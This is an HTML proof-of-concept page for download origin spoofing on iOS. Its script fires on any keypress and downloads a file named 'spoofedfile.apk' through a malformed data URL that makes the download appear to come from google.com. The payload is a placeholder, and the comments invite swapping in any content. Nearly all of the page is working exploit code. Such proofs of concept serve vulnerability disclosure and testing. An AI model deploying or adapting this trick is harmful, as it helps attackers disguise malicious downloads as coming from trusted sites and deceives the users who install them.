<body>
  <center><h2>PoC for Download Origin Spoofing on iOS</h2></center>

  <script>
    // Listen for a keydown event to trigger download
    window.addEventListener('keydown', function(e) {
      openDownload();
    });

    // Function to trigger the download using the malformed data URL
    function openDownload() {
      // The 'data://google.com/html,somepayload' is a malformed data URL
      // You can replace 'somepayload' with any string or base64-encoded content
      const payload = "somepayload"; // Change this to any custom payload you need
      initiateDownload("data://google.com/html," + encodeURIComponent(payload), "spoofedfile.apk");
    }

    // Helper function to initiate the download
    function initiateDownload(uri, name) {
      const link = document.createElement("a");
      link.href = uri;
      link.download = name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
  </script>

  <p>Press any key to start the download. The payload is: <code>somepayload</code></p>
